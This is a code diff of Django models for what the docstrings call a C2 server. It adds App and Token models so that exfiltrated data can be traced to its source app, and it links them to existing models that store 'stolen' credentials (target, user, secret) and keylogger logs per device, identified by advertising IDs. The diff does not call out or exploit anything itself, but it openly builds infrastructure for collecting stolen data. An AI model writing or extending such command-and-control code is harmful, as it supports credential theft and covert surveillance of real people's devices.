@@ -3,9 +3,8 @@
 from django.db import models, IntegrityError
 
 
-class ApplicationModel(models.Model):
+class BaseModel(models.Model):
     '''Abstract base to add timestamps to other models.'''
-
     created_at = models.DateTimeField(auto_now_add=True)
     updated_at = models.DateTimeField(auto_now=True)
 
@@ -13,17 +12,8 @@ class ApplicationModel(models.Model):
         abstract = True
 
 
-class Device(ApplicationModel):
+class Device(BaseModel):
     '''A specific device, aggregation point for other information.'''
-
-    token = models.CharField(max_length=100)
-
-    class Meta:
-        indexes = [
-            models.Index(fields=['token']),
-        ]
-        unique_together = ['token']
-
     def create_device_ids(self, ids):
         '''
         Create device ids for this device in a way that run their validations.
@@ -34,9 +24,8 @@ class Device(ApplicationModel):
             self.device_ids.create(**new_id)
 
 
-class DeviceId(ApplicationModel):
+class DeviceId(BaseModel):
     '''Identifies for a device each has a type and a value.'''
-
     IdType = models.TextChoices('IdType', 'GOOGLE_AD_ID IOS_ID')
     id_type = models.CharField(choices=IdType.choices, max_length=100)
     value = models.CharField(max_length=100)
@@ -66,13 +55,32 @@ class DeviceId(ApplicationModel):
 models.signals.pre_save.connect(DeviceId.validate_ids, sender=DeviceId)
 
 
-class Credential(ApplicationModel):
-    '''A stolen credential with information about where it came from.'''
+class App(BaseModel):
+    '''Apps initegrated with C2 server'''
+    name = models.CharField(max_length=100, unique=True)
+    api_key = models.CharField(max_length=100, unique=True)
 
+
+class Token(BaseModel):
+    '''API token. Per Device and App in order to display exfil source.'''
+    token = models.CharField(max_length=100, unique=True)
+    device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='tokens')
+    app = models.ForeignKey(App, on_delete=models.CASCADE, related_name='tokens')
+
+    class Meta:
+        indexes = [
+            models.Index(fields=['device_id', 'app_id']),
+        ]
+        unique_together = [['device_id', 'app_id']]
+
+
+class Credential(BaseModel):
+    '''A stolen credential with information about where it came from.'''
     target = models.CharField(max_length=100)
     user = models.CharField(max_length=100)
     secret = models.CharField(max_length=100, blank=True)
     device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='credentials')
+    app = models.ForeignKey(App, null=True, on_delete=models.SET_NULL, related_name='credentials')
 
     class Meta:
         indexes = [
@@ -81,8 +89,8 @@ class Credential(ApplicationModel):
         unique_together = [['target', 'user', 'device_id']]
 
 
-class Log(ApplicationModel):
+class Log(BaseModel):
     '''A stolen log like from a keylogger.'''
-
     text = models.TextField()
     device = models.ForeignKey(Device, on_delete=models.CASCADE, related_name='logs')
+    app = models.ForeignKey(App, null=True, on_delete=models.SET_NULL, related_name='logs')
